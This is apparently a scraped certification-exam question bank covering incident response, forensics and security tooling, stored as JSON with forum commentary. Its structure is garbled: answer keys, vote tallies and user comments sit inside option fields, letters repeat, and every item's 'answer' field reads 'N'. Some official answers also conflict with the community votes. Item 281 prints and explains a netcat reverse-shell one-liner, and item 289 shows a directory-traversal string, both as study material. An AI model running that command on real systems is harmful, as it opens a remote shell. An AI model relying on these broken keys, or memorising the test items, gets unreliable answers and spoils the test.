te a dynamic detection strategy based on behavioral analysis and\nattack patterns. Which of the following best describes what the analyst will be creating?", "options": [{"letter": "A", "text": "Bots"}, {"letter": "B", "text": "IoCs"}, {"letter": "C", "text": "TTPs"}, {"letter": "D", "text": "Signatures\nCorrect Answer: C\nCommunity vote distribution\nC (100%)\n  ID77 Highly Voted  1 year, 7 months ago\nSelected Answer: C\nTactics, Techniques and Procedures (TTPs) are methods, tools and strategies that cyber threat actors use to develop and execute cyber attacks.\nupvoted 8 times"}], "answer": "N"}, {"id": 270, "question": "Which of the following would eliminate the need for different passwords for a variety of internal applications?", "options": [{"letter": "A", "text": "CASB"}, {"letter": "B", "text": "SSO"}, {"letter": "C", "text": "PAM"}, {"letter": "D", "text": "MFA\nCorrect Answer: B\nCommunity vote distribution\nB (100%)\n  luiiizsoares 1 year, 5 months ago\nSelected Answer: B\nExplanation:\nSingle Sign-On (SSO):\nSSO enables users to authenticate once and gain access to multiple applications and systems without needing to enter credentials for each one. This\neliminates the need for multiple passwords and reduces the administrative burden of managing different credentials across various internal\napplications.\nupvoted 4 times\n  ChopSNap 1 year, 6 months ago\nSelected Answer: B\nOnly other alternative would be Federation, which isn't listed.\nupvoted 4 times"}], "answer": "N"}, {"id": 271, "question": "Which of the following best explains the importance of communicating with staff regarding the official public communication plan related to\nincidents impacting the organization?", "options": [{"letter": "A", "text": "To establish what information is allowed to be released by designated employees"}, {"letter": "B", "text": "To designate an external public relations firm to represent the organization"}, {"letter": "C", "text": "To ensure that all news media outlets are informed at the same lime"}, {"letter": "D", "text": "To define how each employee will be contacted after an event occurs\nCorrect Answer: A\nCommunity vote distribution\nA (100%)\n  KANKALE 1 year, 5 months ago\nSelected Answer: A\nTo determine what information can be shared and to have control over the communication.\nupvoted 3 times\n  ChopSNap 1 year, 6 months ago\nSelected Answer: A"}, {"letter": "A", "text": "To establish what information is allowed to be released by designated employees\nThis ensures that there is a clear protocol about who can communicate certain information and what specific details can be shared. This helps\nmaintain consistency, accuracy, and control over the information that is being disclosed to the public and media, thereby protecting the organization's\nreputation and ensuring compliance with legal and regulatory requirements.\nupvoted 4 times"}], "answer": "N"}, {"id": 272, "question": "Which of the following would most likely be used to update a dashboard that integrates with multiple vendor tools?", "options": [{"letter": "A", "text": "Webhooks"}, {"letter": "B", "text": "Extensible Markup Language"}, {"letter": "C", "text": "Threat feed combination"}, {"letter": "D", "text": "JavaScript Object Notation\nCorrect Answer: A\nCommunity vote distribution\nA (100%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: A"}, {"letter": "A", "text": "Webhooks\nWebhooks are a way to deliver real-time information from one application to another via HTTP POST requests. They can be used to trigger actions or\nupdates in response to events, such as new alerts or security incidents.\nupvoted 11 times\n  Gduru1960 Most Recent  4 months ago\nSelected Answer: A\nWebhooks, because they push near-real-time event updates from multiple vendor tools into your dashboard without polling, while XML and JSON are\ndata formats and “threat feed combination” is not the integration mechanism.\nupvoted 1 times"}], "answer": "N"}, {"id": 273, "question": "An organization has a critical financial application hosted online that does not allow event logging to send to the corporate SIEM. Which of the\nfollowing is the best option for the security analyst to configure to improve the efficiency of security operations?", "options": [{"letter": "A", "text": "Configure a new SIEM specific to the management of the hosted environment."}, {"letter": "B", "text": "Subscribe to a threat feed related to the vendor's application."}, {"letter": "C", "text": "Use a vendor-provided API to automate pulling the logs in real time."}, {"letter": "D", "text": "Download and manually import the logs outside of business hours.\nCorrect Answer: C\nCommunity vote distribution\nC (100%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: C"}, {"letter": "C", "text": "Use a vendor-provided API to automate pulling the logs in real time.\nThis approach offers several advantages:\nReal-time monitoring: By pulling logs in real time, the security analyst can immediately detect and respond to threats.\nAutomation: Automating the log collection process reduces manual effort and the risk of human error.\nIntegration with existing SIEM: The collected logs can be integrated with the existing SIEM, allowing for centralized monitoring and analysis.\nupvoted 7 times"}], "answer": "N"}, {"id": 274, "question": "After an incident, a security analyst needs to perform a forensic analysis to report complete information to a company stakeholder. Which of the\nfollowing is most likely the goal of the forensic analysis in this case?", "options": [{"letter": "A", "text": "Provide a full picture of the existing risks."}, {"letter": "B", "text": "Notify law enforcement of the incident."}, {"letter": "C", "text": "Further contain the incident."}, {"letter": "D", "text": "Determine root cause information.\nCorrect Answer: D\nCommunity vote distribution\nD (83%)                            A (17%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: D"}, {"letter": "D", "text": "Determine root cause information\nBy understanding the root cause, the analyst can:\nIdentify vulnerabilities: Pinpoint weaknesses that were exploited.\nImplement preventive measures: Take steps to prevent similar incidents in the future.\nImprove incident response: Learn from the incident and refine response procedures.\nComply with regulations: Demonstrate due diligence and meet regulatory requirements.\nupvoted 8 times\n  Cyde Most Recent  1 year, 3 months ago\nSelected Answer: D\nIn order to complete the report, the analyst must determine the root cause of the incident. Going with D\nupvoted 2 times\n  study_study 1 year, 4 months ago\nSelected Answer: A\nI think this question is poor. It could be A in my opinion due to this being reported specifically for a company stakeholder and therefore a full picture\nmay need to be provided.\nupvoted 2 times\n  fafd232_ 1 year, 1 month ago\nThe keywords that made me consider D instead of A are the words \"existing risks\" in answer A. I wouldn't want to assume that those risks still\nexist, they could've been eradicated/remediated during the IR process.\nupvoted 1 times"}], "answer": "N"}, {"id": 275, "question": "Which of the following is the most important reason for an incident response team to develop a formal incident declaration?", "options": [{"letter": "A", "text": "To require that an incident be reported through the proper channels"}, {"letter": "B", "text": "To identify and document staff who have the authority to decrease an incident"}, {"letter": "C", "text": "To allow for public disclosure of a security event impacting the organization"}, {"letter": "D", "text": "To establish the department that responsible for responding to an incident\nCorrect Answer: A\nCommunity vote distribution\nA (73%)                         B (27%)\n  Freshly Highly Voted  1 year, 6 months ago\nSelected Answer: A\nPretty straight forward on this on this one.\nupvoted 7 times\n  Popeyes_Chicken Most Recent  1 year, 4 months ago\nSelected Answer: A\nIdentifying staff with authority is part of incident management, but it's not the primary reason for declaring an incident. That step usually comes after\nthe incident is reported.\nupvoted 2 times\n  Leyton 1 year, 6 months ago\nSelected Answer: A\nIt is A\nupvoted 2 times\n  maggie22 1 year, 7 months ago\nSelected Answer: B\nHaving the authority to declare the incident quickly is essential to launching a fast and coordinated response. Without a clear declaration process,\nvaluable time is lost trying to determine who is in charge, which can allow a security threat to escalate.\nupvoted 4 times\n  1574aa7 10 months, 1 week ago\nThat would be in the Incident response plan , once they already escalated , then the irt can confirm its resolved , the irp declares the roles and all\nthat , in this case A is the most important , if u do process of elimination, because they have to be reported to the proper channels and\nstakeholders as well\nupvoted 1 times"}], "answer": "N"}, {"id": 276, "question": "An organization has establish a formal change management process after experiencing several critical system failures over the past year. Which\nof the following are key factors that the change management process will include in order to reduce the impact of system failures? (Choose two.)", "options": [{"letter": "A", "text": "Ensure users the document system recovery plan prior to deployment."}, {"letter": "B", "text": "Perform a full system-level backup following the change."}, {"letter": "C", "text": "Leverage an audit tool to identify changes that are being made."}, {"letter": "D", "text": "Identify assets with dependence that could be impacted by the change."}, {"letter": "E", "text": "Require diagrams to be completed for all critical systems."}, {"letter": "F", "text": "Ensure that all assets are properly listed in the inventory management system.\nCorrect Answer: CD\nCommunity vote distribution\nCD (57%)                    AD (31%)        A (12%)\n  An381038 Highly Voted  1 year, 4 months ago\nSelected Answer: CD"}, {"letter": "C", "text": "Leverage an audit tool to identify changes that are being made.\nThis ensures that any changes made to the system are tracked, helping to identify what went wrong if something fails. It improves accountability and\nallows the team to trace back issues caused by recent changes."}, {"letter": "D", "text": "Identify assets with dependence that could be impacted by the change.\nThis ensures that any changes made to one system don’t negatively affect other systems or components. By understanding dependencies, the\norganization can better plan and minimize the risk of cascading failures.\nupvoted 7 times\n  kaka321 Most Recent  1 month, 1 week ago\nSelected Answer: AD\nIn really world for every CR a rollback plan is always in place which is A. Then D is also important\nupvoted 1 times\n  1574aa7 10 months ago\nSelected Answer: A\nI have pick A D , as whenever changes are being made, you would need a rollback plan , thats why ensure a document for system recovery is included\n, is necessary , in case the change ends up in failure, and , identify assets with dependency , to ensure any changes made , as per the question do not\nimpact changes, or per say , in this option , to identify which would be impacted, and deal wit them accordingly\nupvoted 2 times\n  IT_guru_in_training 1 year ago\nSelected Answer: CD\nCD - Chat GPT\nupvoted 2 times\n  kmicic77 11 months, 3 weeks ago\nA, D - Gemini 2.5 Pro and ChatGPT model o3 ;-)\nupvoted 1 times\n  ChopSNap 1 year, 6 months ago\nSelected Answer: AD\nEnsure recovery options for a botched upgrade, and get multiple eyes on systems downstream that could be impacted. Source - facilitated Change\nManagement at several organizations\nupvoted 2 times\n  Aziz132 1 year, 6 months ago\nSelected Answer: AD\nA) Ensure a document for system recovery is included. (This is already done in my organization, it is part of any CRQ we submit.) Back up has to be\navailable incase the change fails, glitches, or have unexpected impacts.\nD) Dependencies also has to be identified prior to performing the change. This needs to be completed so that system owners that might be impacted\nare informed, and they inform their users. We also do that.\nC is compliance item like tripwire. It is not related to Change Requests.\nI will vote A and D\nupvoted 3 times"}], "answer": "N"}, {"id": 277, "question": "An analyst is suddenly unable to enrich data from the firewall. However, the other open intelligence feeds continue to work. Which of the following\nis the most likely reason in the firewall feed stopped working?", "options": [{"letter": "A", "text": "The firewall service account was locked out."}, {"letter": "B", "text": "The firewall was using a paid feed."}, {"letter": "C", "text": "The firewall certificate expired."}, {"letter": "D", "text": "The firewall failed open.\nCorrect Answer: A\nCommunity vote distribution\nC (62%)                           A (32%)\n(   )\n  hashed_pony Highly Voted  1 year, 5 months ago\nSelected Answer: C\nThis is such a stupid question. You can have several correct answers for this and none is more correct than the other.\nupvoted 12 times\n  zecomeia_007 Highly Voted  1 year, 6 months ago\nSelected Answer: A\nFirewall service account locked out (A):\nMany firewalls use service accounts to authenticate with external intelligence feeds. If this account is locked, the firewall would lose the ability to\nquery or receive data from the feed. This is a common issue and is consistent with the scenario where only one specific feed is affected.\nupvoted 7 times\n  JayWeston Most Recent  10 months ago\nSelected Answer: B\nI was actually thinking of B. The question is really vague, but I latched onto other \"open intelligence feeds\" continue to work which lead me to believe\nthat the open source (aka free) feeds still work and this paid feed does not work.\nAlso the question states that you are \"unable to ENRICH data from the firewall.\" I would think a locked out account or bad certificate would cause you\nto be unable to GET data from the firewall.\nupvoted 3 times\n  Susan4041 12 months ago\nSelected Answer: C\nI really hope I don't get this question on my test it could be all of them and its really dumb.\nupvoted 3 times\n  fafd232_ 1 year, 1 month ago\nSelected Answer: A\nIm picking A over C because if the firewall's certificate failed, such is the case in Answer C, then the question should've focused on the firewall as a\nwhole having issues and not just its feed capability.\nupvoted 1 times\n  Susan4041 1 year, 2 months ago\nSelected Answer: A\nIf the firewall service account is locked out, the system would no longer be able to authenticate and fetch data, resulting in a disruption of the firewall\nfeed. This is a common reason why specific data sources, such as firewall logs, may stop working while other feeds continue to operate normally.\nDumb Question\nupvoted 2 times\n  thisguyfucks 1 year, 6 months ago\nSelected Answer: C\nIm going with C.\nupvoted 1 times\n  ChopSNap 1 year, 6 months ago\nSelected Answer: C"}, {"letter": "C", "text": "The firewall certificate expired.\nCertificate expiration can disrupt communication and data exchange, including the ability to enrich data with external intelligence feeds.\nupvoted 4 times"}], "answer": "N"}, {"id": 278, "question": "A security analyst would like to integrate two different SaaS-based security toots so that one tool can notify the other in the event a threat is\ndetected. Which of the following should the analyst utilize to best accomplish this goal?", "options": [{"letter": "A", "text": "SMB share"}, {"letter": "B", "text": "API endpoint"}, {"letter": "C", "text": "SMTP notification"}, {"letter": "D", "text": "SNMP trap\nCorrect Answer: B\nCommunity vote distribution\nB (100%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: B"}, {"letter": "B", "text": "API endpoint\nAn API (Application Programming Interface) endpoint allows for direct communication and data exchange between two applications. By utilizing an\nAPI endpoint, the security analyst can:\nAutomate data sharing: Trigger actions in one tool based on events in the other.\nReal-time notifications: Ensure timely alerts and incident response.\nCustomizable integrations: Tailor the integration to specific needs and requirements.\nupvoted 9 times\n  magmadiver1937 Most Recent  5 months, 3 weeks ago\nSelected Answer: B\nSecurity toots? CompTIA are testing our knowledge of farts now.\nupvoted 2 times"}], "answer": "N"}, {"id": 279, "question": "An analyst is imaging a hard drive that was obtained from the system of an employee who is suspected of going rogue. The analyst notes that the\ninitial hash of the evidence drive does not match the resultant hash of the imaged copy. Which of the following best describes the reason for the\nconflicting investigative findings?", "options": [{"letter": "A", "text": "Chain of custody was not maintained for the evidence drive."}, {"letter": "B", "text": "Legal authorization was not obtained prior to seizing the evidence drive."}, {"letter": "C", "text": "Data integrity of the imaged drive could not be verified."}, {"letter": "D", "text": "Evidence drive imaging was performed without a write blocker.\nCorrect Answer: D\nCommunity vote distribution\nD (89%)                           C (11%)\n  KANKALE Highly Voted  1 year, 5 months ago\nSelected Answer: D\nIf a write blocker was not used, or if it was improperly configured, the original evidence drive may have been altered when connected for imaging.\nupvoted 8 times\n  shaifullah Most Recent  2 months, 2 weeks ago\nSelected Answer: C\nThis means:\nThe copied image is not identical to the original drive.\nTherefore, the data integrity cannot be verified.\nBecause the hashes differ, the forensic image cannot be trusted as a valid copy of the evidence.\nupvoted 2 times"}], "answer": "N"}, {"id": 280, "question": "A development team is preparing to roll out a beta version of a web application and wants to quickly test for vulnerabilities, including SQL\ninjection, path traversal, and cross-site scripting. Which of the following tools would the security team most likely recommend to perform this\ntest?", "options": [{"letter": "A", "text": "Hashcat"}, {"letter": "B", "text": "OpenVAS"}, {"letter": "C", "text": "OWASP ZAP"}, {"letter": "D", "text": "Nmap\nCorrect Answer: C\nCommunity vote distribution\nC (100%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: C"}, {"letter": "C", "text": "OWASP ZAP\nOWASP ZAP (Zed Attack Proxy) is a popular open-source web application security scanner designed specifically for testing web applications for\nvulnerabilities. It's user-friendly and offers a range of features, including:\nAutomated scanning: Quickly identifies common vulnerabilities.\nManual testing: Allows for in-depth analysis and custom attacks.\nProxy interception: Monitors and manipulates web traffic in real-time.\nVulnerability reports: Provides detailed reports on identified issues.\nupvoted 7 times\n  magmadiver1937 Most Recent  5 months, 3 weeks ago\nSelected Answer: C\nHashcat is for cracking hashes. OpenVAS is a vulnerability scanner. Nmap is a network recon tool that can also do vulnerability scans but I don't know\nif it has scrips that can find common WebApp vulnerabilities. OWASP ZAP is a WebApp testing tool (similar to Burpsuite) so in theory it should be\nable to test for WebApp vulnerabilities quickly but I haven't used it before so I cannot confirm how it works. C is best answer given the choices.\nupvoted 3 times"}], "answer": "N"}, {"id": 281, "question": "A security analyst detected the following suspicious activity:\nrm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 > tmp/f\nWhich of the following most likely describes the activity?", "options": [{"letter": "A", "text": "Network pivoting"}, {"letter": "B", "text": "Host scanning"}, {"letter": "C", "text": "Privilege escalation"}, {"letter": "D", "text": "Reverse shell\nCorrect Answer: D\nCommunity vote distribution\nD (100%)\n  Cyde Highly Voted  1 year, 3 months ago\nSelected Answer: D\nsh -i = always reverse shell\nupvoted 7 times\n  magmadiver1937 Most Recent  5 months, 3 weeks ago\nSelected Answer: D\nNetwork pivoting would be something like ssh to another server, so not A. Host scanning would either be nmap or a bash for loop that uses ping or\nsomething to interact with other servers over the network, so not B. Privilege escalation would usually involve abusing misconfigured permissions on\nfiles or programs (refer to gtfobins project for references), so not C. Given that all the others won't work, D is best answer. But if you dont want to use\nprocess of elimination then refer to ChonSNap's comment which explains it well. A good reference for reverse shells is revshell[.]com. /bin/sh -i is\nusually the giveaway because it means starting an interactive shell that can receive commands, etc.\nupvoted 2 times\n  ChopSNap 1 year, 6 months ago\nSelected Answer: D\nThe provided command sequence is indicative of creating a reverse shell. Here's a breakdown of the command:\nbash\nrm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f\nrm -f /tmp/f: Removes the file /tmp/f if it exists.\nmknod /tmp/f p: Creates a named pipe /tmp/f.\ncat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f: Pipes the input from the named pipe to /bin/sh (starting an interactive shell), redirects the\nshell's input and output through netcat (nc), which then connects to the IP address 10.0.0.1 on port 1234, and sends the shell's output back through\nthe named pipe.\nupvoted 3 times"}], "answer": "N"}, {"id": 282, "question": "An analyst is designing a message system for a bank. The analyst wants to include a feature that allows the recipient of a message to prove to a\nthird party that the message came from the sender.\nWhich of the following information security goals is the analyst most likely trying to achieve?", "options": [{"letter": "A", "text": "Non-repudiation"}, {"letter": "B", "text": "Authentication"}, {"letter": "C", "text": "Authorization"}, {"letter": "D", "text": "Integrity\nCorrect Answer: A\nCommunity vote distribution\nA (100%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: A\nIn the context of the CySA exam: \"An analyst is designing a message system for a bank. The analyst wants to include a feature that allows the\nrecipient of a message to prove to a third party that the message came from the sender. Which of the following information security goals is the\nanalyst most likely trying to achieve? A. Non-repudiation B. Authentication C. Authorization D. Integrity \"\nThe information security goal that the analyst is trying to achieve in this scenario is:"}, {"letter": "A", "text": "Non-repudiation\nNon-repudiation ensures that the sender cannot deny having sent a message, and the recipient can prove to a third party that the message indeed\ncame from the sender. This is typically achieved through digital signatures and cryptographic techniques.\nupvoted 10 times\n  magmadiver1937 Most Recent  5 months, 3 weeks ago\nSelected Answer: A\nThis one can use process of elimination. Authentication refers to using credentials to prove identity and the question is asking about proving that the\nsender actually sent the message, so not B. Authorization refers to whether the user is authorized to do an action which in this scenario is implied\nthey are allowed so not C. Integrity would mean that the content of the message was not tampered with so close but the question is asking about the\nproving the sender sent the message and not data integrity so not D. A is the only choice left.\nupvoted 2 times"}], "answer": "N"}, {"id": 283, "question": "Before adopting a disaster recovery plan, some team members need to gather in a room to review the written scenarios. Which of the following\nbest describes what the team is doing?", "options": [{"letter": "A", "text": "Simulation"}, {"letter": "B", "text": "Tabletop exercise"}, {"letter": "C", "text": "Full test"}, {"letter": "D", "text": "Parallel test\nCorrect Answer: B\nCommunity vote distribution\nB (100%)\n  magmadiver1937 5 months, 3 weeks ago\nSelected Answer: B\nThis question is poorly worded. But definitely not Full or Parallel Test. If you are reading through scenarios that either be a Table Top or Simulation\nwhich at work we would use those terms interchangeably. But it sounds less involved (i.e., just reading) so table top make most sense given the\noptions.\nupvoted 2 times\n  ChopSNap 1 year, 6 months ago\nSelected Answer: B\nThe team is conducting a Tabletop Exercise.\nA tabletop exercise involves a facilitated discussion where participants work through a simulated disaster scenario. It allows teams to practice\ndecision-making, communication, and coordination without the logistical complexities of a full-scale simulation or test.\nupvoted 4 times"}], "answer": "N"}, {"id": 284, "question": "Which of the following entities should an incident manager work with to ensure correct processes are adhered to when communicating incident\nreporting to the general public, as a best practice? (Choose two.)", "options": [{"letter": "A", "text": "Law enforcement"}, {"letter": "B", "text": "Governance"}, {"letter": "C", "text": "Legal"}, {"letter": "D", "text": "Manager"}, {"letter": "E", "text": "Public relations"}, {"letter": "F", "text": "Human resources\nCorrect Answer: C\nCommunity vote distribution\nE (54%)                        C (46%)\n  Aziz132 Highly Voted  1 year, 6 months ago\nSelected Answer: E\nC and E\nupvoted 11 times\n  2c7fd04 Most Recent  1 month, 1 week ago\nSelected Answer: C\nC&E...why the system won't let you pick two for a pick 2 question is beyond me lol\nupvoted 2 times\n  magmadiver1937 5 months, 3 weeks ago\nSelected Answer: C\nAnswer should be C and E. During IRs, legal is always involved and if company is big enough and has a dedicated PR team then you work with them.\nManager and HR not crucial. Law enforcement is a no, they would not guide on comms. Governance is too broad a term so hard to say in this context.\nupvoted 2 times\n  azuredemo2022three 7 months, 2 weeks ago\nSelected Answer: C"}, {"letter": "C", "text": "Legal"}, {"letter": "E", "text": "Public relations\nupvoted 2 times\n  Cyde 1 year, 3 months ago\nSelected Answer: E\nBoth C and E (Legal & PR)\nupvoted 2 times\n  An381038 1 year, 4 months ago\nSelected Answer: C\nC and E"}, {"letter": "C", "text": "Legal: The legal team ensures that any public communication regarding the incident complies with laws, regulations, and contractual obligations,\nand that the organization doesn't accidentally disclose sensitive information or violate privacy laws."}, {"letter": "E", "text": "Public relations: The PR team is responsible for crafting and managing the message to the public.\nupvoted 3 times\n  zecomeia_007 1 year, 6 months ago\nSelected Answer: C"}, {"letter": "C", "text": "Legal and E. Public relations are the two entities an incident manager should work with to ensure correct processes are adhered to when\ncommunicating incident reporting to the general public.\nupvoted 4 times"}], "answer": "N"}, {"id": 285, "question": "Due to an incident involving company devices, an incident responder needs to take a mobile phone to the lab for further investigation. Which of\nthe following tools should be used to maintain the integrity of the mobile phone while it is transported? (Choose two.)", "options": [{"letter": "A", "text": "Signal-shielded bag"}, {"letter": "B", "text": "Tamper-evident seal"}, {"letter": "C", "text": "Thumb drive"}, {"letter": "D", "text": "Crime scene tape"}, {"letter": "E", "text": "Write blocker"}, {"letter": "F", "text": "Drive duplicator\nCorrect Answer: AB\nCommunity vote distribution\nAB (100%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: AB\nThe two best options for maintaining the integrity of the mobile phone during transportation are:"}, {"letter": "A", "text": "Signal-shielded bag and B. Tamper-evident seal\nHere's why:\nSignal-shielded bag: This prevents remote wiping or data destruction from being initiated remotely.\nTamper-evident seal: This physically indicates if the device has been accessed or tampered with during transport.\nupvoted 10 times\n  magmadiver1937 Most Recent  5 months, 3 weeks ago\nSelected Answer: AB\nOnly A and B make sense. The other choices do not apply or make no sense. How would a USB be used to maintain the integrity of a mobile device?\nor Crime scene tape? Are you going to wrap a phone in yellow tape while you transport it?\nupvoted 3 times"}], "answer": "N"}, {"id": 286, "question": "During the rollout of a patch to the production environment, it was discovered that required connections to remote systems are no longer possible.\nWhich of the following steps would have most likely revealed this gap?", "options": [{"letter": "A", "text": "Implementation"}, {"letter": "B", "text": "User acceptance testing"}, {"letter": "C", "text": "Validation"}, {"letter": "D", "text": "Rollback\nCorrect Answer: B\nCommunity vote distribution\nC (94%)\n(   )\n  Dogsitter_3 Highly Voted  10 months, 2 weeks ago\nSelected Answer: C\nHad this question on the exam\nupvoted 6 times\n  jiggu12 9 months, 3 weeks ago\nhey did the questions come from this question bank?\nupvoted 1 times\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: C\nThe most likely step that would have revealed this gap is C. Validation.\nValidation involves testing the patch to ensure it functions as intended and doesn't introduce new vulnerabilities or problems. This step would have\nincluded testing the connectivity to remote systems, which would have identified the issue.\nClosest other option could be B, but UAT is tailored towards determining if a given solution will meet the need that the application is being brought on\nboard to fulfill.\nupvoted 6 times\n  magmadiver1937 Most Recent  5 months, 3 weeks ago\nSelected Answer: C\nA and D make no sense. Kind of toss-up between UAT and Validation. I would say Validation because in general UAT environments are not used when\ntesting a patch but for more testing apps before they are released into PROD.\nupvoted 3 times\n  Perc 10 months ago\nSelected Answer: B\nUser Acceptance Testing (UAT) is the final stage where real users test the system in a near-production environment. If required connections to remote\nsystems weren’t working, this would have been caught before rollout if proper UAT was done.\nupvoted 1 times\n  Perc 10 months ago\nnvm this is a technical integration issue, likely caught in validation testing, not UAT. if validation had included thorough connectivity checks, the\nissue would’ve been caught before implementation.\nupvoted 2 times\n  braveheart22 1 year, 2 months ago\nSelected Answer: C\nC = Validation is the correct answer\nHere's why:\nValidation is the process of testing the patch in a controlled environment (like a staging or pre-production environment) that closely mirrors the\nproduction environment. This allows for thorough testing of the patch's functionality and identification of any unintended consequences, such as\nbreaking remote connections, before it's deployed to production.\nupvoted 1 times"}], "answer": "N"}, {"id": 287, "question": "An organization has tracked several incidents that are listed in the following table:\nWhich of the following is the organization’s MTTD?", "options": [{"letter": "A", "text": "140"}, {"letter": "B", "text": "150"}, {"letter": "C", "text": "160"}, {"letter": "D", "text": "180\nCorrect Answer: C\nCommunity vote distribution\nC (100%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: C\nAdd up the detection times:\n180 + 150 + 170 + 140 = 640 minutes\nDivide the total by the number of incidents:\n640 minutes / 4 incidents = 160 minutes\nupvoted 15 times\n  magmadiver1937 Most Recent  5 months, 3 weeks ago\nSelected Answer: C\ncalculate the mean of the 4 numbers in the 3rd column to find answer.\nupvoted 2 times\n  3lVhylla 6 months, 1 week ago\nSelected Answer: C\nthis a simple math calculation: average\nupvoted 2 times\n  fuzzyguzzy 1 year, 5 months ago\nSelected Answer: C\nJust average all the elapsed times and you will get your answer.\nupvoted 4 times"}], "answer": "N"}, {"id": 288, "question": "A security analyst has found a moderate-risk item in an organization’s point-of-sale application. The organization is currently in a change freeze\nwindow and has decided that the risk is not high enough to correct at this time. Which of the following inhibitors to remediation does this scenario\nillustrate?", "options": [{"letter": "A", "text": "Service-level agreement"}, {"letter": "B", "text": "Business process interruption"}, {"letter": "C", "text": "Degrading functionality"}, {"letter": "D", "text": "Proprietary system\nCorrect Answer: B\nCommunity vote distribution\nB (100%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: B\nThe inhibitor in this scenario is B. Business process interruption.\nThe organization has opted to delay the remediation due to the current change freeze window, indicating that applying the patch or fix at this time\nwould disrupt ongoing business operations.\nupvoted 10 times\n  magmadiver1937 Most Recent  5 months, 3 weeks ago\nSelected Answer: B\nUse process of elimination. No mention of degrading performance or that the POS is proprietary. No mentions of SLAs. B is the only option.\nupvoted 2 times"}], "answer": "N"}, {"id": 289, "question": "While reviewing the web server logs, a security analyst notices the following snippet:\n..\\../..\\../boot.ini\nWhich of the following is being attempted?", "options": [{"letter": "A", "text": "Directory traversal"}, {"letter": "B", "text": "Remote file inclusion"}, {"letter": "C", "text": "Cross-site scripting"}, {"letter": "D", "text": "Remote code execution"}, {"letter": "E", "text": "Enumeration of /etc/passwd\nCorrect Answer: A\nCommunity vote distribution\nA (100%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: A\nThis is a clear attempt at A. Directory traversal.\nDirectory traversal is an attack technique where an attacker tries to access files and directories outside the intended scope by manipulating URL\npaths or file paths. In this case, the attacker is trying to access the boot.ini file, which is typically located in the root directory of a Windows system.\nupvoted 13 times\n  magmadiver1937 Most Recent  5 months, 3 weeks ago\nSelected Answer: A\nUse process of elimination. Not E (output does not match that file). Not D (no code is shown). Not CSS (the web server log if it logs this activity\nwould have HTML or Javascript in the entry such document.cookie or whatever) so not C. Remote file inclusion is when a webapp downloads and\nexecutes code from another server. If that was in web server logs I think it would include something like ip-address/script.py or something with that\nsyntax. That leaves only A.\nupvoted 3 times\n  Dogsitter_3 10 months, 2 weeks ago\nSelected Answer: A\nHad this on the exam\nupvoted 2 times\n  Popeyes_Chicken 1 year, 4 months ago\nSelected Answer: A\nThis indicates an attempt to traverse directories upward in the file system to access sensitive files.\nupvoted 4 times"}], "answer": "N"}, {"id": 290, "question": "Exploit code for a recently disclosed critical software vulnerability was publicly available for download for several days before being removed.\nWhich of the following CVSS v.3.1 temporal metrics was most impacted by this exposure?", "options": [{"letter": "A", "text": "Remediation level"}, {"letter": "B", "text": "Exploit code maturity"}, {"letter": "C", "text": "Report confidence"}, {"letter": "D", "text": "Availability\nCorrect Answer: B\nCommunity vote distribution\nB (100%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: B\nThe CVSS v.3.1 temporal metric most impacted by the early public availability of exploit code is B. Exploit Code Maturity.\nThis metric measures the extent to which exploit code is available and functional. Early public availability of exploit code significantly increases the\nmaturity of the exploit, making it easier for attackers to exploit the vulnerability.\nupvoted 11 times"}], "answer": "N"}, {"id": 291, "question": "Which of the following in the digital forensics process is considered a critical activity that often includes a graphical representation of process\nand operating system events?", "options": [{"letter": "A", "text": "Registry editing"}, {"letter": "B", "text": "Network mapping"}, {"letter": "C", "text": "Timeline analysis"}, {"letter": "D", "text": "Write blocking\nCorrect Answer: C\nCommunity vote distribution\nC (100%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: C\nThe correct answer is C. Timeline analysis.\nExplanation:\nIn digital forensics, timeline analysis is a critical activity that involves reconstructing the sequence of events based on data from various sources,\nsuch as system logs, timestamps, file metadata, and other artifacts. The purpose of timeline analysis is to establish when specific actions occurred,\noften to understand the sequence of events leading up to or following an incident. This process often includes a graphical representation (e.g., a\ntimeline or event chart) that visually displays the chronological order of system events and activities, making it easier to correlate and analyze data\nupvoted 6 times\n  magmadiver1937 Most Recent  5 months, 3 weeks ago\nSelected Answer: C\nUse process of elimination again. Network mapping refers to using a script or nmap to find systems on a network. Registry editing would involve\nchanging values of the Registry in Windows (using PS and CMD or with regedit). Write blocking refers to using a device for forensic acquisition (e.g.,\nTableau) where you copy a disk but do not write data to it. So only C makes sense.\nupvoted 2 times"}], "answer": "N"}, {"id": 292, "question": "Which of the following best describes the importance of KPIs in an incident response exercise?", "options": [{"letter": "A", "text": "To identify the personal performance of each analyst"}, {"letter": "B", "text": "To describe how incidents were resolved"}, {"letter": "C", "text": "To reveal what the team needs to prioritize"}, {"letter": "D", "text": "To expose which tools should be used\nCorrect Answer: C\nCommunity vote distribution\nC (100%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: C\nThe correct answer is C. To reveal what the team needs to prioritize.\nKPIs (Key Performance Indicators) in an incident response exercise help identify areas where the team can improve. By analyzing the performance\nmetrics, the team can determine which areas need more focus, such as:\nDetection time: How quickly incidents are detected\nResponse time: How quickly the team responds to incidents\nIncident resolution time: How long it takes to resolve incidents\nEffectiveness of containment: How well the team can contain the impact of incidents\nAccuracy of root cause analysis: How accurately the team can identify the root cause of incidents\nupvoted 5 times"}], "answer": "N"}, {"id": 293, "question": "An organization is conducting a pilot deployment of an e-commerce application. The application’s source code is not available. Which of the\nfollowing strategies should an analyst recommend to evaluate the security of the 